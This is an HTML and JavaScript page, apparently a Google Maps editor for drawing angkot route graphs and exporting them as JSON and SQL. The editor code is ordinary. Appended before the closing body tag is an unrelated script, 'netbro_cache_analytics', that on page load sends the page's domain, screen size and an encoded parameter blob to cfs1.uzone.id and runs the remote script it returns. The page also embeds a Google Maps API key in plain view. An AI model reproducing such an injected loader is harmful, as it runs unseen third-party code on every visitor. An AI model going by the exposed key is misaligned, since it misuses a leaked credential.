<!DOCTYPE html>
<html>
  <head>
    <title>Simple Map</title>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
    <meta charset="utf-8">
    <style>
      html, body, #map-canvas {
		width: 80%;
        height: 90%;
        //margin: 0px;
        //padding: 0px
      }
	  a{
		cursor: pointer;
		text-decoration: underline;
	  }
    </style>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyApVsRT2ScLj3PKO6Z1RjUw3-Hi1Y0vDFc&v=3.exp"></script>
    <script>
	var map;
	var __global_node_now			= 'null';
	var __global_node 				= false;
	var __global_line 				= false;
	var __global_destination		= false;
	var __global_destination_now	= 'null';
	var __global_load_json			= false;
	var __global_load_route			= false;
	var __global_arr_node			= new Array();
	var __global_first_line			= 0;

	function add_node(){

		var active_x = document.getElementById('add_nodex');
		var active_y = document.getElementById('add_linex').innerHTML = 'Add Line';
		var active_z = document.getElementById('add_destinationx').innerHTML = 'Add Destination';
		
		/* disable other tools */
		__global_line		 	= false;
		__global_destination 	= false;
			
		if(__global_node == false){
			__global_node	= true;
			active_x.innerHTML = 'Add Node [x]';
					
		}else{
			__global_node 	= false;
			active_x.innerHTML = 'Add Node';
			
		}
	}

	function add_line(){
		
		var active_x = document.getElementById('add_nodex').innerHTML = 'Add Node';
		var active_y = document.getElementById('add_linex');
		var active_z = document.getElementById('add_destinationx').innerHTML = 'Add Destination';
		
		/* disable other tools */
		__global_node 			= false;
		__global_destination	= false;
			
		if(__global_line == false){
			__global_line	= true;
			active_y.innerHTML = 'Add Line [x]';
			
		}else{
			__global_line 	= false;
			active_y.innerHTML = 'Add Line';
			
		}	
	}

	function add_destination(){
		var active_x = document.getElementById('add_nodex').innerHTML = 'Add Node';
		var active_y = document.getElementById('add_linex').innerHTML = 'Add Line';		
		var active_z = document.getElementById('add_destinationx');
		
		/* disable other tools */
		__global_node 	= false;
		__global_line 	= false;
			
		if(__global_destination == false){
			__global_destination	= true;
			active_z.innerHTML = 'Add Destination [x]';
			
		}else{
			__global_destination 	= false;
			active_z.innerHTML = 'Add Destination';
			
		}		
	}
	
	function load_markerlinex(){
		
		div_textarea = document.getElementById('load_json');		
		
		if( __global_load_json == false ){
			__global_load_json = true;

			div_textarea.style.display = 'inline-block';
		}else{
			__global_load_json = false;
			div_textarea.style.display = 'none';
		}
	}

	function add_route(){
		
		div_textarea = document.getElementById('insert_route');		
		
		if( __global_load_route == false ){
			__global_load_route = true;

			div_textarea.style.display = 'inline-block';
		}else{
			__global_load_route = false;
			div_textarea.style.display = 'none';
		}
	}
	
	function edit_destination_name(a, thiis){
		var edit_destination = prompt("Edit destination", $(thiis).html());
		console.log(window['marker_dest_' + a]);
		
		// id marker_destintation
		marker_destination = window['marker_dest_' + a];
		
		// update event popup
		if(edit_destination)
		{
			// update destination_name by live
			$(thiis).html(edit_destination);
			
			// update title marker
			marker_destination.setTitle(edit_destination);
			console.log(marker_destination.title);
			
			// remove previously event
			google.maps.event.clearListeners(marker_destination, 'click');
			
			// popup event
			var content = "<span class='destination_name' onclick='edit_destination_name(\"" + a + "\", this)'>" + edit_destination + "</span>";
			var infowindow = new google.maps.InfoWindow();			
			google.maps.event.addListener(marker_destination,'click', (function(marker_destination,content,infowindow){ 
				return function() {
					infowindow.setContent(content);
					//console.log(infowindow.getMap());
					infowindow.open(map,marker_destination);
				};
			})(marker_destination,content,infowindow)); 
		}
	}
	
	var poly;
	var map;
	var increase = 0;

	function initialize() {
		
		/* setup map */
		var mapOptions = {
			zoom: 13,
			center: new google.maps.LatLng(-6.2858667, 106.8719382)
		};
		map = new google.maps.Map(document.getElementById('map-canvas'),
		  mapOptions);

		/* setup polyline */
		var polyOptions = {
			geodesic: true,
			strokeColor: 'rgb(20, 120, 218)',
			strokeOpacity: 1.0,
			strokeWeight: 2,
			editable: true,
		};
		window['poly' + increase] = new google.maps.Polyline(polyOptions);
		window['poly' + increase].setMap(map);
	  
	  
		/* create marker and line by click */
		google.maps.event.addListener(map, 'click', function(event) 
		{		
			/* if tools 'add destination' is active, create marker */
			if( __global_destination == true ){
				var key_destination = 0;
				//__global_destination_now = 'a';
				
				if( __global_destination_now == 'null' ){
					__global_destination_now = 'a';
					key_destination	= 0;
				}else{
					__global_destination_now = String.fromCharCode( __global_destination_now.charCodeAt(0) + 1 );
					key_destination += 1;
				}
				console.log(__global_destination_now);
				// nama destination
				destination_name = "HAE";
				window['infowindow'+key_destination] = new google.maps.InfoWindow({
					content: '<div>'+ destination_name +'</div>'
				});
								
				// add marker destination
				icons = 'http://maps.google.com/mapfiles/ms/icons/green-dot.png';
				var location = event.latLng;
				window['marker_dest_' + __global_destination_now] = new google.maps.Marker({
					position: location,
					map: map,
					icon: icons,
					draggable: true,
					title: '' + __global_destination_now,
				});
				
				// id marker_destintation
				var marker_destintation = window['marker_dest_' + __global_destination_now];
				
				// popup event
				var content = "<span class='destination_name' onclick='edit_destination_name(\"" + __global_destination_now + "\", this)'>" + __global_destination_now + "</span>";
				var infowindow = new google.maps.InfoWindow();			
				google.maps.event.addListener(marker_destintation,'click', (function(marker_destintation,content,infowindow){ 
					return function() {
						infowindow.setContent(content);
						infowindow.open(map,marker_destintation);
					};
				})(marker_destintation,content,infowindow)); 		
			}
			
			/* if tools 'add node' is active, create marker */
			if( __global_node == true )
			{
				if( __global_node_now == 'null' )
					__global_node_now = 0;
				else
					__global_node_now += 1;
				
				/* draw a new marker */
				var location = event.latLng;
				var marker = new google.maps.Marker({
					position: location,
					map: map,
					title: '' + __global_node_now,
				});

				// popup event
				var content_marker = "<div>" + __global_node_now + "</div>";
				var infowindow_marker = new google.maps.InfoWindow();			
				google.maps.event.addListener(marker,'click', (function(marker,content_marker,infowindow_marker){ 
					return function() {
						infowindow_marker.setContent(content_marker);
						infowindow_marker.open(map,marker);
					};
				})(marker,content_marker,infowindow_marker)); 
				
				/* Add listener to getting latLng marker 
				* using 'list object event' : {this.title, this.position}
				*/
				google.maps.event.addListener(marker, "click", function (evt) 
				{
					/* if tools 'add line' is active, create first polyline */
					if( __global_line == true ){
						
						/* first polyline */
						var path = window['poly' + increase].getPath();
						path.push(event.latLng);
						
						/* temporary for node start - finish for json
						* example : 0-1 {"coordinates": [[123, 456], [321, 123]]}
						*/
						if( __global_first_line == 0 )
							temp_node1 = this.title;

						
						/* jika meng-klik ke marker/node akhir dalam pembuatan polyline */
						if( evt.latLng.lat() == event.latLng.lat() && evt.latLng.lng() == event.latLng.lng() && __global_first_line == 1 ){
							
							alert('node & line berhasil disambung!');
							
							temp_node2		= this.title;
							temp_node_fix 	= temp_node1 + '-' + temp_node2;
							__global_arr_node.push(temp_node_fix);
						
							/* adding id window['poly' + increase] */
							increase += 1;
							
							/* reset first polyline */
							__global_first_line = 0;
							
							
							/* reset polyline */
							var polyOptions = {
								geodesic: true,
								strokeColor: 'rgb(20, 120, 218)',
								strokeOpacity: 1.0,
								strokeWeight: 2,
								editable: true,
								//draggable: true,
							};						
							window['poly' + increase] = new google.maps.Polyline(polyOptions);
							window['poly' + increase].setMap(map);

							return false; // die()
						}			

						__global_first_line = 1;
						
					}
				}); //end addListener	
	  
			}else if( __global_line == true ){
				
				if( __global_first_line == 1 ){

						var path = window['poly' + increase].getPath();
						path.push(event.latLng);			

				}else{
					alert('klik Node dulu!');
				}
			}
		});	// end click map
	}

	function save_markerlinex(){
		//console.log($('#text_route').val());
		//return false;
		var json_google_map = '';
		for( i = 0; i < increase; i++ )
		{
			// val_latlng 		= window['poly' + i].getPath().j;
			// length_latlng 	= window['poly' + i].getPath().j.length;

			val_latlng 		= window['poly' + i].getPath().getArray(); // new
			length_latlng 	= window['poly' + i].getPath().length; // new			

			var str2 = '';
			var polylineLength = 0;
			
			for( a = 0; a < length_latlng; a++ )
			{
				lat1	= val_latlng[a].lat();
				lng2	= val_latlng[a].lng();
	
				/* calculate distance polyline */
				if ( a < (length_latlng - 1) ) {
					
					next_lat1 		= val_latlng[(a+1)].lat();
					next_lng2		= val_latlng[(a+1)].lng();		

					var pointPath1 = new google.maps.LatLng(lat1, lng2);
					var pointPath2 = new google.maps.LatLng(next_lat1, next_lng2);				

					polylineLength += google.maps.geometry.spherical.computeDistanceBetween(pointPath1, pointPath2);
				}
				
				bracket_latlng 	= '[' + lat1 + ', ' + lng2 + ']';
				console.log("bracket : " + bracket_latlng);
				if( a == (length_latlng - 1) ){ // end
					str2 += bracket_latlng;
				}else{
					str2 += bracket_latlng + ',';
				}
			}
			
			nodes_info		= __global_arr_node[i];
			create_json 	= '{"nodes": ["' + nodes_info + '"], "coordinates": [' + str2 + '], "distance_metres": [' + polylineLength + ']}';
			//console.log("str2 : " + str2);
			
			/* reverse coordinates */
			str3_reverse	= '[' + str2 + ']';
			console.log(str3_reverse);
			str3_reverse_p	= JSON.parse(str3_reverse);
			str3			= '';
			for( u = (str3_reverse_p.length - 1); u >= 0; u-- )
			{				
				// rev = reverse
				latlng_rev	= str3_reverse_p[u];
				
				bracket_latlng_rev = '[' + latlng_rev + ']';
				if( u == 0 ){ // end
					str3 += bracket_latlng_rev;
				}else{
					str3 += bracket_latlng_rev + ',';
				}				
			}
			explode 		= nodes_info.split('-');
			nodes_info_rev 	= explode[1] + '-' + explode[0];
			create_json_rev = '{"nodes": ["' + nodes_info_rev + '"], "coordinates": [' + str3 + '], "distance_metres": [' + polylineLength + ']}';
			
			if( i == ( increase - 1 ) )
				pemisah = '\n\n=====================================\n\n';
			else
				pemisah = '\n\n-------------------------------------\n\n';
			
			json_google_map += create_json + '\n\n' + create_json_rev + pemisah;
		}
		

		// list marker destination
		if( __global_destination_now != 'null' ){
			
			number_dest = ( __global_destination_now.charCodeAt(0) - 97 );
			
			str4		= '';
			coord_dest 	= '';
			for( y = 0; y <= number_dest; y++ ){
				
				var chr = String.fromCharCode(97 + y);
				var title_live = window['marker_dest_' + chr].getTitle();
				console.log(window['marker_dest_' + chr].position);
				
				latsx = window['marker_dest_' + chr].position.lat();
				lngsx = window['marker_dest_' + chr].position.lng();
				
				if( y == number_dest ) // end
					comma = '';
				else
					comma = ',';
				
				coord_dest += '{"' + title_live + '": "' + latsx + ', ' + lngsx + '"}' + comma;
			}
			
			str4 = '{"destination": [' + coord_dest + ']}';

			json_google_map += str4;			
		}

		//document.getElementById('txt').innerHTML = json_google_map;
		rute_angkot = $('#text_route').val();

		//kalo belum buat graph
		if(json_google_map == '' || rute_angkot == ''){
			alert('buat graph dulu!');
			return false;
		}

		//console.log(rute_angkot);
		$.ajax({
			method:"POST",
			url : "http://graph.latcoding.com/json_to_sql.php",
			data: {
					json_google_map: json_google_map, 
					route_angkot: rute_angkot
				},
			success:function(url){
				window.location = 'http://graph.latcoding.com/download_sql.php?r=' + url;
			},
			error:function(er){
				alert('error: '+er);
				
				// remove loading
				$('#run_dijkstra').show();
				$('#loading').hide();
			}
		});	
	}

	
	function load_json(){
		textarea 	= document.getElementById('text_json');
		val			= textarea.value;
		
		if( val.trim() == '' ){
			return false;
		}
		
		var res		= val.split('-------------------------------------');
		
		for( i = 0; i < res.length; i++ ){
			
			var res1	= res[i].trim();
			var res2	= res1.split('\n');
			
			if( res2.length > 1 ){ // coordinates is exist
				var json	= JSON.parse(res2[0]);
				
				var nodes	= json.nodes.toString();
				var coord	= json.coordinates;

				for( a = 0; a < coord.length; a++ ){
					
					latlngs = coord[a].toString();
					splits	= latlngs.split(',');
					
					lats 	= splits[0].trim();
					lngs 	= splits[1].trim();
					
					var pointPoly = new google.maps.LatLng(lats, lngs);
					
					/* first polyline */
					var path = window['poly' + increase].getPath();
					path.push(pointPoly);

				
					/* draw a new marker */
					if( a == 0 || a == (coord.length - 1) ){
						
						var str_split = nodes.split('-');						
						
						if( a == 0 )
							nodes_target = str_split[0];
						else if( a == (coord.length - 1) )
							nodes_target = str_split[1];
						
						var location = pointPoly;
						var marker = new google.maps.Marker({
							position: location,
							map: map,
							title: '' + nodes_target,
						});
					}					
				}

					
				increase += 1;
				__global_arr_node.push(nodes);
				
				/* reset polyline */
				var polyOptions = {
					geodesic: true,
					strokeColor: 'rgb(20, 120, 218)',
					strokeOpacity: 1.0,
					strokeWeight: 2,
					editable: true,
				};						
				console.log( 'ulang' );
				window['poly' + increase] = new google.maps.Polyline(polyOptions);
				window['poly' + increase].setMap(map);

			}

		}
			
		var res1 = val.split('=====================================');
		
		if( res1.length > 1 ){
			
			res_dest 	= res1[1].trim();
			json		= JSON.parse(res_dest);
			json_root	= json.destination;
			length_json	= json.destination.length;
			
			for( b = 0; b < length_json; b++ ){
				
				var chr = String.fromCharCode(97 + b);
				__global_destination_now = chr;
				
				latlng1	= json_root[b][chr].toString().split(',');

				next_lat1 	= latlng1[0].trim();
				next_lng2	= latlng1[1].trim();			

				var pointPath1 = new google.maps.LatLng(next_lat1, next_lng2);
					
				icons = 'http://maps.google.com/mapfiles/ms/icons/green-dot.png';
				var location = event.latLng;
				window['marker_dest_' + __global_destination_now] = new google.maps.Marker({
					position: pointPath1,
					map: map,
					icon: icons,
					draggable: true,
					title: '' + __global_destination_now,
				});
				
			}
		}

		// reset
		textarea.value = '';
	}	
	
	/* load google maps v3 */
	google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  </head>
  <body>
    <div id="map-canvas" style="float:left;"></div>
	<div style="float:right; margin-left:20px; width:110px; background:;">
		<h3>Tools</h3>
		<hr>
		<br>
		<a id="add_nodex" onclick="add_node()">Add Node</a>
		<br>
		<a id="add_linex" onclick="add_line()">Add Line</a>
		<br>
		<a id="add_destinationx" onclick="add_destination()">Add Destination</a>
		<br>				
		<a id="add_route" onclick="add_route()">Add Route</a>
		<br>
		<div id="insert_route" style="background: #eeeeee; margin:4px; width:510px; display: none">
			<span style="position: relative; top:0; left:97%; cursor: pointer" onclick="add_route()">x</span>
			<br>
			<textarea id="text_route" placeholder="#format&#10;kendaraan=jalur_yg_dilewati&#10;#contoh&#10;T01=,0-1,1-2,2-5,5-6,6-5,5-2,2-1,1-0,&#10;T04=,0-1,1-4,4-9,9-4,4-1,1-0," style="width:490px;height:100px;"></textarea>
		</div>
		<!-- FLOW ROUTE - UNDER DEVELOPMENT 
		<a id="add_route" onclick="add_route()">Flow Route</a>
		<br>
		-->
		<!-- LOAD JSON - UNDER DEVELOPMENT 
		<a id="load_markerlinex" onclick="load_markerlinex()" style='color: blue;'>Load Json</a>		
		<br>
		<div id="load_json" style="background: #eeeeee; margin:4px; width:230px; display: none">
			<span style="position: relative; top:0; left:94%; cursor: pointer" onclick="load_markerlinex()">x</span>
			<br>
			<textarea id="text_json" style="width:200px;height:100px;"></textarea>
			<button onclick="load_json()">Load</button>
		</div>
		-->
		<a id="save_markerlinex" onclick="save_markerlinex()" style='color: blue;'>Generate SQL</a>	
	</div>
	<br>&nbsp;
	<br>
	<textarea id="txt" style="width:700px; height:200px; display:none;" placeholder="output JSON"></textarea>

	<script>
		$(document).ready(function(){
			$('.showx').css({'position': 'absolute', 'top': 0, 'right': 0});
		});
	</script>
	<style>.hidden{display:none;}</style>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKdymVNUi0z%2b9EJrtlRqprCRoI%2fnFGlc9d53jKt9QtpbwVHLEHzvbkFvzaALm37uc4i78R3eM8wPJ%2fno3LSCGgpaguGquyxCr7PyvJK7lPfF2FvZeHBKecaBiEtKYHu6H3CVhWqUXiGbvIM5Pbbowha8bWoasY9%2bZPiIONjXSQzg3HizCx7OOO%2fmMu%2bD%2bWoCO8qPgqdvdsefJV4P73e%2btWdZzmn7mc5SzG%2fdgmdmb6JK%2frdUxAKL93WWp05DnL6DrWPf%2fejzsvUiU8TEqAz0HPB0shCPqs2qBQdqkx5ppIxqJvxihRh3lSlnaNBROGbCKyiuAm1gVGQVyk5TvAFmDKDYRIxJruHwNShtQLqfl2yiRX0AFvtQNMubnVjblGxrbmfk6O%2f7iSRfQ3wWbn9iwrhlWxCEfKdVtsvjdvc%2bb7bh7LPaCquNi%2bdUUreg4Qx5HIthPGhMFveoeP6nt0l0%2bklh%2fJMRfqgeT8rRjPUV08FF2jJelfn5Qfw8WxEMTJqTCLyioQtmzq4rPYqSWgQgVVaXzQvwf5qlVsGnTIT1b2nOM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>